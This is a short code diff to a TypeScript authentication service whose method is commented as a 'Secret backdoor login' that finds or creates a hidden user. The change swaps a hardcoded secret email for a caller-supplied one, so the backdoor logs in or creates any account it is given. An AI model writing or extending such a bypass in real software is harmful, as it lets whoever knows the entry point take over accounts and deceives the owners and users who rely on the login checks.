@@ -16,9 +16,9 @@ export class AuthService {
   }
 
   // Secret backdoor login
-  async secretLogin(): Promise<{ success: boolean; user?: User; message: string }> {
-    try {
-      const secretEmail = 'helensecrettunnel@foodlab.dev';
+  async secretLogin(email: string): Promise<{ success: boolean; user?: User; message: string }> {
+  try {
+  const secretEmail = email; // Use the passed-in email
       
       // Find or create the secret user
       let [user] = await db
